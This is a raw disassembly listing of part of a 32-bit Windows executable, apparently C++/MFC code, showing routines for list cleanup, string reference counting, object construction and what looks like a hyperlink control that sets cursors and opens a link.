  402cae:	56                   	push   %esi
  402caf:	a3 ac 17 42 00       	mov    %eax,0x4217ac
  402cb4:	ff d7                	call   *%edi
  402cb6:	68 a8 03 42 00       	push   $0x4203a8
  402cbb:	56                   	push   %esi
  402cbc:	a3 b0 17 42 00       	mov    %eax,0x4217b0
  402cc1:	ff d7                	call   *%edi
  402cc3:	68 9c 03 42 00       	push   $0x42039c
  402cc8:	56                   	push   %esi
  402cc9:	a3 b4 17 42 00       	mov    %eax,0x4217b4
  402cce:	ff d7                	call   *%edi
  402cd0:	8b 0d a0 17 42 00    	mov    0x4217a0,%ecx
  402cd6:	a3 b8 17 42 00       	mov    %eax,0x4217b8
  402cdb:	85 c9                	test   %ecx,%ecx
  402cdd:	5f                   	pop    %edi
  402cde:	74 3d                	je     0x402d1d
  402ce0:	8b 0d a4 17 42 00    	mov    0x4217a4,%ecx
  402ce6:	85 c9                	test   %ecx,%ecx
  402ce8:	74 33                	je     0x402d1d
  402cea:	8b 0d a8 17 42 00    	mov    0x4217a8,%ecx
  402cf0:	85 c9                	test   %ecx,%ecx
  402cf2:	74 29                	je     0x402d1d
  402cf4:	8b 0d ac 17 42 00    	mov    0x4217ac,%ecx
  402cfa:	85 c9                	test   %ecx,%ecx
  402cfc:	74 1f                	je     0x402d1d
  402cfe:	8b 0d b0 17 42 00    	mov    0x4217b0,%ecx
  402d04:	85 c9                	test   %ecx,%ecx
  402d06:	74 15                	je     0x402d1d
  402d08:	8b 0d b4 17 42 00    	mov    0x4217b4,%ecx
  402d0e:	85 c9                	test   %ecx,%ecx
  402d10:	74 0b                	je     0x402d1d
  402d12:	85 c0                	test   %eax,%eax
  402d14:	74 07                	je     0x402d1d
  402d16:	b8 01 00 00 00       	mov    $0x1,%eax
  402d1b:	5e                   	pop    %esi
  402d1c:	c3                   	ret
  402d1d:	33 c0                	xor    %eax,%eax
  402d1f:	5e                   	pop    %esi
  402d20:	c3                   	ret
  402d21:	90                   	nop
  402d22:	90                   	nop
  402d23:	90                   	nop
  402d24:	90                   	nop
  402d25:	90                   	nop
  402d26:	90                   	nop
  402d27:	90                   	nop
  402d28:	90                   	nop
  402d29:	90                   	nop
  402d2a:	90                   	nop
  402d2b:	90                   	nop
  402d2c:	90                   	nop
  402d2d:	90                   	nop
  402d2e:	90                   	nop
  402d2f:	90                   	nop
  402d30:	53                   	push   %ebx
  402d31:	8b d9                	mov    %ecx,%ebx
  402d33:	55                   	push   %ebp
  402d34:	57                   	push   %edi
  402d35:	8b 6b 04             	mov    0x4(%ebx),%ebp
  402d38:	8b 7d 00             	mov    0x0(%ebp),%edi
  402d3b:	3b fd                	cmp    %ebp,%edi
  402d3d:	74 34                	je     0x402d73
  402d3f:	56                   	push   %esi
  402d40:	8b f7                	mov    %edi,%esi
  402d42:	8b 3f                	mov    (%edi),%edi
  402d44:	6a 01                	push   $0x1
  402d46:	8b 46 04             	mov    0x4(%esi),%eax
  402d49:	8b 0e                	mov    (%esi),%ecx
  402d4b:	89 08                	mov    %ecx,(%eax)
  402d4d:	8b 16                	mov    (%esi),%edx
  402d4f:	8b 46 04             	mov    0x4(%esi),%eax
  402d52:	8d 4e 08             	lea    0x8(%esi),%ecx
  402d55:	89 42 04             	mov    %eax,0x4(%edx)
  402d58:	ff 15 b4 54 41 00    	call   *0x4154b4
  402d5e:	56                   	push   %esi
  402d5f:	e8 34 ff 00 00       	call   0x412c98
  402d64:	8b 4b 08             	mov    0x8(%ebx),%ecx
  402d67:	83 c4 04             	add    $0x4,%esp
  402d6a:	49                   	dec    %ecx
  402d6b:	3b fd                	cmp    %ebp,%edi
  402d6d:	89 4b 08             	mov    %ecx,0x8(%ebx)
  402d70:	75 ce                	jne    0x402d40
  402d72:	5e                   	pop    %esi
  402d73:	8b 4b 04             	mov    0x4(%ebx),%ecx
  402d76:	51                   	push   %ecx
  402d77:	e8 1c ff 00 00       	call   0x412c98
  402d7c:	83 c4 04             	add    $0x4,%esp
  402d7f:	33 c0                	xor    %eax,%eax
  402d81:	89 43 04             	mov    %eax,0x4(%ebx)
  402d84:	89 43 08             	mov    %eax,0x8(%ebx)
  402d87:	5f                   	pop    %edi
  402d88:	5d                   	pop    %ebp
  402d89:	5b                   	pop    %ebx
  402d8a:	c3                   	ret
  402d8b:	90                   	nop
  402d8c:	90                   	nop
  402d8d:	90                   	nop
  402d8e:	90                   	nop
  402d8f:	90                   	nop
  402d90:	8b 11                	mov    (%ecx),%edx
  402d92:	8b 02                	mov    (%edx),%eax
  402d94:	89 01                	mov    %eax,(%ecx)
  402d96:	8b 44 24 04          	mov    0x4(%esp),%eax
  402d9a:	89 10                	mov    %edx,(%eax)
  402d9c:	c2 08 00             	ret    $0x8
  402d9f:	90                   	nop
  402da0:	53                   	push   %ebx
  402da1:	55                   	push   %ebp
  402da2:	56                   	push   %esi
  402da3:	57                   	push   %edi
  402da4:	8b 7c 24 18          	mov    0x18(%esp),%edi
  402da8:	8b d9                	mov    %ecx,%ebx
  402daa:	6a 18                	push   $0x18
  402dac:	8b 6f 04             	mov    0x4(%edi),%ebp
  402daf:	e8 38 ff 00 00       	call   0x412cec
  402db4:	83 c4 04             	add    $0x4,%esp
  402db7:	8b f0                	mov    %eax,%esi
  402db9:	85 ff                	test   %edi,%edi
  402dbb:	8b c7                	mov    %edi,%eax
  402dbd:	75 02                	jne    0x402dc1
  402dbf:	8b c6                	mov    %esi,%eax
  402dc1:	89 06                	mov    %eax,(%esi)
  402dc3:	8b c5                	mov    %ebp,%eax
  402dc5:	85 ed                	test   %ebp,%ebp
  402dc7:	75 02                	jne    0x402dcb
  402dc9:	8b c6                	mov    %esi,%eax
  402dcb:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  402dcf:	89 46 04             	mov    %eax,0x4(%esi)
  402dd2:	89 77 04             	mov    %esi,0x4(%edi)
  402dd5:	8b 46 04             	mov    0x4(%esi),%eax
  402dd8:	8d 56 08             	lea    0x8(%esi),%edx
  402ddb:	51                   	push   %ecx
  402ddc:	52                   	push   %edx
  402ddd:	89 30                	mov    %esi,(%eax)
  402ddf:	e8 2c 01 00 00       	call   0x402f10
  402de4:	8b 43 08             	mov    0x8(%ebx),%eax
  402de7:	83 c4 08             	add    $0x8,%esp
  402dea:	40                   	inc    %eax
  402deb:	89 43 08             	mov    %eax,0x8(%ebx)
  402dee:	8b 44 24 14          	mov    0x14(%esp),%eax
  402df2:	5f                   	pop    %edi
  402df3:	89 30                	mov    %esi,(%eax)
  402df5:	5e                   	pop    %esi
  402df6:	5d                   	pop    %ebp
  402df7:	5b                   	pop    %ebx
  402df8:	c2 0c 00             	ret    $0xc
  402dfb:	90                   	nop
  402dfc:	90                   	nop
  402dfd:	90                   	nop
  402dfe:	90                   	nop
  402dff:	90                   	nop
  402e00:	8b 44 24 0c          	mov    0xc(%esp),%eax
  402e04:	55                   	push   %ebp
  402e05:	57                   	push   %edi
  402e06:	8b 7c 24 10          	mov    0x10(%esp),%edi
  402e0a:	3b f8                	cmp    %eax,%edi
  402e0c:	8b e9                	mov    %ecx,%ebp
  402e0e:	74 6a                	je     0x402e7a
  402e10:	53                   	push   %ebx
  402e11:	56                   	push   %esi
  402e12:	33 db                	xor    %ebx,%ebx
  402e14:	8b f7                	mov    %edi,%esi
  402e16:	8b 3f                	mov    (%edi),%edi
  402e18:	8b 46 04             	mov    0x4(%esi),%eax
  402e1b:	8b 0e                	mov    (%esi),%ecx
  402e1d:	89 08                	mov    %ecx,(%eax)
  402e1f:	8b 16                	mov    (%esi),%edx
  402e21:	8b 46 04             	mov    0x4(%esi),%eax
  402e24:	89 42 04             	mov    %eax,0x4(%edx)
  402e27:	8b 4e 0c             	mov    0xc(%esi),%ecx
  402e2a:	3b cb                	cmp    %ebx,%ecx
  402e2c:	74 1e                	je     0x402e4c
  402e2e:	8a 41 ff             	mov    -0x1(%ecx),%al
  402e31:	3a c3                	cmp    %bl,%al
  402e33:	74 0b                	je     0x402e40
  402e35:	3c ff                	cmp    $0xff,%al
  402e37:	74 07                	je     0x402e40
  402e39:	fe c8                	dec    %al
  402e3b:	88 41 ff             	mov    %al,-0x1(%ecx)
  402e3e:	eb 0c                	jmp    0x402e4c
  402e40:	83 c1 fe             	add    $0xfffffffe,%ecx
  402e43:	51                   	push   %ecx
  402e44:	e8 4f fe 00 00       	call   0x412c98
  402e49:	83 c4 04             	add    $0x4,%esp
  402e4c:	56                   	push   %esi
  402e4d:	89 5e 0c             	mov    %ebx,0xc(%esi)
  402e50:	89 5e 10             	mov    %ebx,0x10(%esi)
  402e53:	89 5e 14             	mov    %ebx,0x14(%esi)
  402e56:	e8 3d fe 00 00       	call   0x412c98
  402e5b:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402e5e:	8b 44 24 20          	mov    0x20(%esp),%eax
  402e62:	83 c4 04             	add    $0x4,%esp
  402e65:	49                   	dec    %ecx
  402e66:	3b f8                	cmp    %eax,%edi
  402e68:	89 4d 08             	mov    %ecx,0x8(%ebp)
  402e6b:	75 a7                	jne    0x402e14
  402e6d:	8b 44 24 14          	mov    0x14(%esp),%eax
  402e71:	5e                   	pop    %esi
  402e72:	5b                   	pop    %ebx
  402e73:	89 38                	mov    %edi,(%eax)
  402e75:	5f                   	pop    %edi
  402e76:	5d                   	pop    %ebp
  402e77:	c2 0c 00             	ret    $0xc
  402e7a:	8b 44 24 0c          	mov    0xc(%esp),%eax
  402e7e:	89 38                	mov    %edi,(%eax)
  402e80:	5f                   	pop    %edi
  402e81:	5d                   	pop    %ebp
  402e82:	c2 0c 00             	ret    $0xc
  402e85:	90                   	nop
  402e86:	90                   	nop
  402e87:	90                   	nop
  402e88:	90                   	nop
  402e89:	90                   	nop
  402e8a:	90                   	nop
  402e8b:	90                   	nop
  402e8c:	90                   	nop
  402e8d:	90                   	nop
  402e8e:	90                   	nop
  402e8f:	90                   	nop
  402e90:	55                   	push   %ebp
  402e91:	56                   	push   %esi
  402e92:	8b 74 24 10          	mov    0x10(%esp),%esi
  402e96:	57                   	push   %edi
  402e97:	8b f9                	mov    %ecx,%edi
  402e99:	8b 46 04             	mov    0x4(%esi),%eax
  402e9c:	8b 0e                	mov    (%esi),%ecx
  402e9e:	8b 2e                	mov    (%esi),%ebp
  402ea0:	89 08                	mov    %ecx,(%eax)
  402ea2:	8b 16                	mov    (%esi),%edx
  402ea4:	8b 46 04             	mov    0x4(%esi),%eax
  402ea7:	89 42 04             	mov    %eax,0x4(%edx)
  402eaa:	8b 46 0c             	mov    0xc(%esi),%eax
  402ead:	85 c0                	test   %eax,%eax
  402eaf:	74 1f                	je     0x402ed0
  402eb1:	8a 48 ff             	mov    -0x1(%eax),%cl
  402eb4:	84 c9                	test   %cl,%cl
  402eb6:	74 0c                	je     0x402ec4
  402eb8:	80 f9 ff             	cmp    $0xff,%cl
  402ebb:	74 07                	je     0x402ec4
  402ebd:	fe c9                	dec    %cl
  402ebf:	88 48 ff             	mov    %cl,-0x1(%eax)
  402ec2:	eb 0c                	jmp    0x402ed0
  402ec4:	83 c0 fe             	add    $0xfffffffe,%eax
  402ec7:	50                   	push   %eax
  402ec8:	e8 cb fd 00 00       	call   0x412c98
  402ecd:	83 c4 04             	add    $0x4,%esp
  402ed0:	56                   	push   %esi
  402ed1:	c7 46 0c 00 00 00 00 	movl   $0x0,0xc(%esi)
  402ed8:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%esi)
  402edf:	c7 46 14 00 00 00 00 	movl   $0x0,0x14(%esi)
  402ee6:	e8 ad fd 00 00       	call   0x412c98
  402eeb:	8b 47 08             	mov    0x8(%edi),%eax
  402eee:	83 c4 04             	add    $0x4,%esp
  402ef1:	48                   	dec    %eax
  402ef2:	89 47 08             	mov    %eax,0x8(%edi)
  402ef5:	8b 44 24 10          	mov    0x10(%esp),%eax
  402ef9:	5f                   	pop    %edi
  402efa:	5e                   	pop    %esi
  402efb:	89 28                	mov    %ebp,(%eax)
  402efd:	5d                   	pop    %ebp
  402efe:	c2 08 00             	ret    $0x8
  402f01:	90                   	nop
  402f02:	90                   	nop
  402f03:	90                   	nop
  402f04:	90                   	nop
  402f05:	90                   	nop
  402f06:	90                   	nop
  402f07:	90                   	nop
  402f08:	90                   	nop
  402f09:	90                   	nop
  402f0a:	90                   	nop
  402f0b:	90                   	nop
  402f0c:	90                   	nop
  402f0d:	90                   	nop
  402f0e:	90                   	nop
  402f0f:	90                   	nop
  402f10:	6a ff                	push   $0xffffffff
  402f12:	68 91 35 41 00       	push   $0x413591
  402f17:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  402f1d:	50                   	push   %eax
  402f1e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  402f25:	51                   	push   %ecx
  402f26:	53                   	push   %ebx
  402f27:	55                   	push   %ebp
  402f28:	56                   	push   %esi
  402f29:	8b 74 24 20          	mov    0x20(%esp),%esi
  402f2d:	57                   	push   %edi
  402f2e:	89 74 24 10          	mov    %esi,0x10(%esp)
  402f32:	33 ed                	xor    %ebp,%ebp
  402f34:	3b f5                	cmp    %ebp,%esi
  402f36:	89 6c 24 1c          	mov    %ebp,0x1c(%esp)
  402f3a:	0f 84 33 01 00 00    	je     0x403073
  402f40:	8b 5c 24 28          	mov    0x28(%esp),%ebx
  402f44:	8a 03                	mov    (%ebx),%al
  402f46:	89 6e 04             	mov    %ebp,0x4(%esi)
  402f49:	88 06                	mov    %al,(%esi)
  402f4b:	89 6e 08             	mov    %ebp,0x8(%esi)
  402f4e:	89 6e 0c             	mov    %ebp,0xc(%esi)
  402f51:	8b 0d c8 54 41 00    	mov    0x4154c8,%ecx
  402f57:	8b 01                	mov    (%ecx),%eax
  402f59:	8b 4b 08             	mov    0x8(%ebx),%ecx
  402f5c:	8b f9                	mov    %ecx,%edi
  402f5e:	3b c7                	cmp    %edi,%eax
  402f60:	73 02                	jae    0x402f64
  402f62:	8b f8                	mov    %eax,%edi
  402f64:	3b f3                	cmp    %ebx,%esi
  402f66:	75 73                	jne    0x402fdb
  402f68:	3b fd                	cmp    %ebp,%edi
  402f6a:	8b d8                	mov    %eax,%ebx
  402f6c:	76 06                	jbe    0x402f74
  402f6e:	ff 15 c4 54 41 00    	call   *0x4154c4
  402f74:	8b ce                	mov    %esi,%ecx
  402f76:	ff 15 c0 54 41 00    	call   *0x4154c0
  402f7c:	8b 46 08             	mov    0x8(%esi),%eax
  402f7f:	2b c7                	sub    %edi,%eax
  402f81:	3b c3                	cmp    %ebx,%eax
  402f83:	73 02                	jae    0x402f87
  402f85:	8b d8                	mov    %eax,%ebx
  402f87:	3b dd                	cmp    %ebp,%ebx
  402f89:	76 35                	jbe    0x402fc0
  402f8b:	8b 4e 04             	mov    0x4(%esi),%ecx
  402f8e:	2b c3                	sub    %ebx,%eax
  402f90:	8d 14 3b             	lea    (%ebx,%edi,1),%edx
  402f93:	50                   	push   %eax
  402f94:	8d 04 51             	lea    (%ecx,%edx,2),%eax
  402f97:	8d 0c 79             	lea    (%ecx,%edi,2),%ecx
  402f9a:	50                   	push   %eax
  402f9b:	51                   	push   %ecx
  402f9c:	e8 ef 00 00 00       	call   0x403090
  402fa1:	8b 7e 08             	mov    0x8(%esi),%edi
  402fa4:	83 c4 0c             	add    $0xc,%esp
  402fa7:	2b fb                	sub    %ebx,%edi
  402fa9:	8b ce                	mov    %esi,%ecx
  402fab:	55                   	push   %ebp
  402fac:	57                   	push   %edi
  402fad:	ff 15 bc 54 41 00    	call   *0x4154bc
  402fb3:	84 c0                	test   %al,%al
  402fb5:	74 09                	je     0x402fc0
  402fb7:	57                   	push   %edi
  402fb8:	8b ce                	mov    %esi,%ecx
  402fba:	ff 15 b8 54 41 00    	call   *0x4154b8
  402fc0:	8b ce                	mov    %esi,%ecx
  402fc2:	ff 15 c0 54 41 00    	call   *0x4154c0
  402fc8:	5f                   	pop    %edi
  402fc9:	5e                   	pop    %esi
  402fca:	5d                   	pop    %ebp
  402fcb:	5b                   	pop    %ebx
  402fcc:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  402fd0:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402fd7:	83 c4 10             	add    $0x10,%esp
  402fda:	c3                   	ret
  402fdb:	3b fd                	cmp    %ebp,%edi
  402fdd:	76 56                	jbe    0x403035
  402fdf:	3b f9                	cmp    %ecx,%edi
  402fe1:	75 52                	jne    0x403035
  402fe3:	8b 43 04             	mov    0x4(%ebx),%eax
  402fe6:	3b c5                	cmp    %ebp,%eax
  402fe8:	75 05                	jne    0x402fef
  402fea:	a1 d0 54 41 00       	mov    0x4154d0,%eax
  402fef:	80 78 ff fe          	cmpb   $0xfe,-0x1(%eax)
  402ff3:	73 40                	jae    0x403035
  402ff5:	6a 01                	push   $0x1
  402ff7:	8b ce                	mov    %esi,%ecx
  402ff9:	ff 15 b4 54 41 00    	call   *0x4154b4
  402fff:	8b 00                	mov    (%eax),%eax
	...
  403ffd:	00 00                	add    %al,(%eax)
  403fff:	00 6a ff             	add    %ch,-0x1(%edx)
  404002:	68 f8 36 41 00       	push   $0x4136f8
  404007:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40400d:	50                   	push   %eax
  40400e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  404015:	51                   	push   %ecx
  404016:	56                   	push   %esi
  404017:	8b f1                	mov    %ecx,%esi
  404019:	89 74 24 04          	mov    %esi,0x4(%esp)
  40401d:	c7 06 00 5c 41 00    	movl   $0x415c00,(%esi)
  404023:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  40402a:	00 
  40402b:	e8 22 ed 00 00       	call   0x412d52
  404030:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  404034:	c7 06 ec 5b 41 00    	movl   $0x415bec,(%esi)
  40403a:	5e                   	pop    %esi
  40403b:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404042:	83 c4 10             	add    $0x10,%esp
  404045:	c3                   	ret
  404046:	90                   	nop
  404047:	90                   	nop
  404048:	90                   	nop
  404049:	90                   	nop
  40404a:	90                   	nop
  40404b:	90                   	nop
  40404c:	90                   	nop
  40404d:	90                   	nop
  40404e:	90                   	nop
  40404f:	90                   	nop
  404050:	56                   	push   %esi
  404051:	8b f1                	mov    %ecx,%esi
  404053:	e8 f4 ec 00 00       	call   0x412d4c
  404058:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  40405d:	74 09                	je     0x404068
  40405f:	56                   	push   %esi
  404060:	e8 33 ec 00 00       	call   0x412c98
  404065:	83 c4 04             	add    $0x4,%esp
  404068:	8b c6                	mov    %esi,%eax
  40406a:	5e                   	pop    %esi
  40406b:	c2 04 00             	ret    $0x4
  40406e:	90                   	nop
  40406f:	90                   	nop
  404070:	56                   	push   %esi
  404071:	8b f1                	mov    %ecx,%esi
  404073:	e8 c2 ec 00 00       	call   0x412d3a
  404078:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  40407d:	74 09                	je     0x404088
  40407f:	56                   	push   %esi
  404080:	e8 13 ec 00 00       	call   0x412c98
  404085:	83 c4 04             	add    $0x4,%esp
  404088:	8b c6                	mov    %esi,%eax
  40408a:	5e                   	pop    %esi
  40408b:	c2 04 00             	ret    $0x4
  40408e:	90                   	nop
  40408f:	90                   	nop
  404090:	6a ff                	push   $0xffffffff
  404092:	68 39 37 41 00       	push   $0x413739
  404097:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40409d:	50                   	push   %eax
  40409e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4040a5:	51                   	push   %ecx
  4040a6:	53                   	push   %ebx
  4040a7:	55                   	push   %ebp
  4040a8:	56                   	push   %esi
  4040a9:	8b f1                	mov    %ecx,%esi
  4040ab:	57                   	push   %edi
  4040ac:	89 74 24 10          	mov    %esi,0x10(%esp)
  4040b0:	e8 d7 eb 00 00       	call   0x412c8c
  4040b5:	c7 06 70 5d 41 00    	movl   $0x415d70,(%esi)
  4040bb:	8d 7e 40             	lea    0x40(%esi),%edi
  4040be:	33 db                	xor    %ebx,%ebx
  4040c0:	8b cf                	mov    %edi,%ecx
  4040c2:	89 5c 24 1c          	mov    %ebx,0x1c(%esp)
  4040c6:	e8 db ec 00 00       	call   0x412da6
  4040cb:	8d 6e 44             	lea    0x44(%esi),%ebp
  4040ce:	c6 44 24 1c 01       	movb   $0x1,0x1c(%esp)
  4040d3:	8b cd                	mov    %ebp,%ecx
  4040d5:	e8 cc ec 00 00       	call   0x412da6
  4040da:	89 5e 4c             	mov    %ebx,0x4c(%esi)
  4040dd:	c7 46 48 30 5a 41 00 	movl   $0x415a30,0x48(%esi)
  4040e4:	68 98 17 42 00       	push   $0x421798
  4040e9:	8b cd                	mov    %ebp,%ecx
  4040eb:	c6 44 24 20 03       	movb   $0x3,0x20(%esp)
  4040f0:	c7 06 b0 5c 41 00    	movl   $0x415cb0,(%esi)
  4040f6:	e8 a5 ec 00 00       	call   0x412da0
  4040fb:	50                   	push   %eax
  4040fc:	8b cf                	mov    %edi,%ecx
  4040fe:	e8 97 ec 00 00       	call   0x412d9a
  404103:	8b 3d 48 56 41 00    	mov    0x415648,%edi
  404109:	68 89 7f 00 00       	push   $0x7f89
  40410e:	53                   	push   %ebx
  40410f:	88 5e 5a             	mov    %bl,0x5a(%esi)
  404112:	88 5e 58             	mov    %bl,0x58(%esi)
  404115:	88 5e 59             	mov    %bl,0x59(%esi)
  404118:	ff d7                	call   *%edi
  40411a:	68 00 7f 00 00       	push   $0x7f00
  40411f:	53                   	push   %ebx
  404120:	89 46 5c             	mov    %eax,0x5c(%esi)
  404123:	ff d7                	call   *%edi
  404125:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  404129:	89 46 60             	mov    %eax,0x60(%esi)
  40412c:	c7 46 64 00 00 ff 00 	movl   $0xff0000,0x64(%esi)
  404133:	8b c6                	mov    %esi,%eax
  404135:	5f                   	pop    %edi
  404136:	5e                   	pop    %esi
  404137:	5d                   	pop    %ebp
  404138:	5b                   	pop    %ebx
  404139:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404140:	83 c4 10             	add    $0x10,%esp
  404143:	c3                   	ret
  404144:	90                   	nop
  404145:	90                   	nop
  404146:	90                   	nop
  404147:	90                   	nop
  404148:	90                   	nop
  404149:	90                   	nop
  40414a:	90                   	nop
  40414b:	90                   	nop
  40414c:	90                   	nop
  40414d:	90                   	nop
  40414e:	90                   	nop
  40414f:	90                   	nop
  404150:	56                   	push   %esi
  404151:	8b f1                	mov    %ecx,%esi
  404153:	e8 18 00 00 00       	call   0x404170
  404158:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  40415d:	74 09                	je     0x404168
  40415f:	56                   	push   %esi
  404160:	e8 33 eb 00 00       	call   0x412c98
  404165:	83 c4 04             	add    $0x4,%esp
  404168:	8b c6                	mov    %esi,%eax
  40416a:	5e                   	pop    %esi
  40416b:	c2 04 00             	ret    $0x4
  40416e:	90                   	nop
  40416f:	90                   	nop
  404170:	6a ff                	push   $0xffffffff
  404172:	68 76 37 41 00       	push   $0x413776
  404177:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40417d:	50                   	push   %eax
  40417e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  404185:	83 ec 08             	sub    $0x8,%esp
  404188:	56                   	push   %esi
  404189:	8b f1                	mov    %ecx,%esi
  40418b:	57                   	push   %edi
  40418c:	89 74 24 08          	mov    %esi,0x8(%esp)
  404190:	c7 06 b0 5c 41 00    	movl   $0x415cb0,(%esi)
  404196:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  40419d:	00 
  40419e:	8d 7e 48             	lea    0x48(%esi),%edi
  4041a1:	89 7c 24 0c          	mov    %edi,0xc(%esp)
  4041a5:	c7 07 00 5c 41 00    	movl   $0x415c00,(%edi)
  4041ab:	8b cf                	mov    %edi,%ecx
  4041ad:	c6 44 24 18 03       	movb   $0x3,0x18(%esp)
  4041b2:	e8 9b eb 00 00       	call   0x412d52
  4041b7:	8d 4e 44             	lea    0x44(%esi),%ecx
  4041ba:	c7 07 ec 5b 41 00    	movl   $0x415bec,(%edi)
  4041c0:	c6 44 24 18 01       	movb   $0x1,0x18(%esp)
  4041c5:	e8 f8 ea 00 00       	call   0x412cc2
  4041ca:	8d 4e 40             	lea    0x40(%esi),%ecx
  4041cd:	c6 44 24 18 00       	movb   $0x0,0x18(%esp)
  4041d2:	e8 eb ea 00 00       	call   0x412cc2
  4041d7:	8b ce                	mov    %esi,%ecx
  4041d9:	c7 44 24 18 ff ff ff 	movl   $0xffffffff,0x18(%esp)
  4041e0:	ff 
  4041e1:	e8 ae eb 00 00       	call   0x412d94
  4041e6:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  4041ea:	5f                   	pop    %edi
  4041eb:	5e                   	pop    %esi
  4041ec:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4041f3:	83 c4 14             	add    $0x14,%esp
  4041f6:	c3                   	ret
  4041f7:	90                   	nop
  4041f8:	90                   	nop
  4041f9:	90                   	nop
  4041fa:	90                   	nop
  4041fb:	90                   	nop
  4041fc:	90                   	nop
  4041fd:	90                   	nop
  4041fe:	90                   	nop
  4041ff:	90                   	nop
  404200:	b8 18 5c 41 00       	mov    $0x415c18,%eax
  404205:	c3                   	ret
  404206:	90                   	nop
  404207:	90                   	nop
  404208:	90                   	nop
  404209:	90                   	nop
  40420a:	90                   	nop
  40420b:	90                   	nop
  40420c:	90                   	nop
  40420d:	90                   	nop
  40420e:	90                   	nop
  40420f:	90                   	nop
  404210:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  404216:	6a ff                	push   $0xffffffff
  404218:	68 88 37 41 00       	push   $0x413788
  40421d:	50                   	push   %eax
  40421e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  404225:	8d 44 24 10          	lea    0x10(%esp),%eax
  404229:	83 c1 44             	add    $0x44,%ecx
  40422c:	50                   	push   %eax
  40422d:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  404234:	00 
  404235:	e8 60 eb 00 00       	call   0x412d9a
  40423a:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  40423e:	c7 44 24 08 ff ff ff 	movl   $0xffffffff,0x8(%esp)
  404245:	ff 
  404246:	e8 77 ea 00 00       	call   0x412cc2
  40424b:	8b 4c 24 00          	mov    0x0(%esp),%ecx
  40424f:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404256:	83 c4 0c             	add    $0xc,%esp
  404259:	c2 04 00             	ret    $0x4
  40425c:	90                   	nop
  40425d:	90                   	nop
  40425e:	90                   	nop
  40425f:	90                   	nop
  404260:	8b 44 24 04          	mov    0x4(%esp),%eax
  404264:	89 41 64             	mov    %eax,0x64(%ecx)
  404267:	c2 04 00             	ret    $0x4
  40426a:	90                   	nop
  40426b:	90                   	nop
  40426c:	90                   	nop
  40426d:	90                   	nop
  40426e:	90                   	nop
  40426f:	90                   	nop
  404270:	8b 44 24 04          	mov    0x4(%esp),%eax
  404274:	50                   	push   %eax
  404275:	e8 46 02 00 00       	call   0x4044c0
  40427a:	c2 04 00             	ret    $0x4
  40427d:	90                   	nop
  40427e:	90                   	nop
  40427f:	90                   	nop
  404280:	56                   	push   %esi
  404281:	8b f1                	mov    %ecx,%esi
  404283:	57                   	push   %edi
  404284:	8a 46 5a             	mov    0x5a(%esi),%al
  404287:	84 c0                	test   %al,%al
  404289:	75 05                	jne    0x404290
  40428b:	e8 a0 02 00 00       	call   0x404530
  404290:	8d 44 24 10          	lea    0x10(%esp),%eax
  404294:	8b ce                	mov    %esi,%ecx
  404296:	50                   	push   %eax
  404297:	e8 44 03 00 00       	call   0x4045e0
  40429c:	84 c0                	test   %al,%al
  40429e:	74 5d                	je     0x4042fd
  4042a0:	8d 7e 44             	lea    0x44(%esi),%edi
  4042a3:	6a 00                	push   $0x0
  4042a5:	68 8c 07 42 00       	push   $0x42078c
  4042aa:	8b cf                	mov    %edi,%ecx
  4042ac:	e8 01 eb 00 00       	call   0x412db2
  4042b1:	85 c0                	test   %eax,%eax
  4042b3:	75 32                	jne    0x4042e7
  4042b5:	8b 4e 20             	mov    0x20(%esi),%ecx
  4042b8:	8b 3f                	mov    (%edi),%edi
  4042ba:	51                   	push   %ecx
  4042bb:	ff 15 44 56 41 00    	call   *0x415644
  4042c1:	50                   	push   %eax
  4042c2:	e8 e5 ea 00 00       	call   0x412dac
  4042c7:	8b 56 20             	mov    0x20(%esi),%edx
  4042ca:	8b 40 20             	mov    0x20(%eax),%eax
  4042cd:	57                   	push   %edi
  4042ce:	52                   	push   %edx
  4042cf:	68 88 13 00 00       	push   $0x1388
  4042d4:	50                   	push   %eax
  4042d5:	ff 15 30 56 41 00    	call   *0x415630
  4042db:	8b ce                	mov    %esi,%ecx
  4042dd:	e8 da e9 00 00       	call   0x412cbc
  4042e2:	5f                   	pop    %edi
  4042e3:	5e                   	pop    %esi
  4042e4:	c2 0c 00             	ret    $0xc
  4042e7:	8b 0f                	mov    (%edi),%ecx
  4042e9:	6a 01                	push   $0x1
  4042eb:	6a 00                	push   $0x0
  4042ed:	6a 00                	push   $0x0
  4042ef:	51                   	push   %ecx
  4042f0:	68 84 07 42 00       	push   $0x420784
  4042f5:	6a 00                	push   $0x0
  4042f7:	ff 15 cc 55 41 00    	call   *0x4155cc
  4042fd:	8b ce                	mov    %esi,%ecx
  4042ff:	e8 b8 e9 00 00       	call   0x412cbc
  404304:	5f                   	pop    %edi
  404305:	5e                   	pop    %esi
  404306:	c2 0c 00             	ret    $0xc
  404309:	90                   	nop
  40430a:	90                   	nop
  40430b:	90                   	nop
  40430c:	90                   	nop
  40430d:	90                   	nop
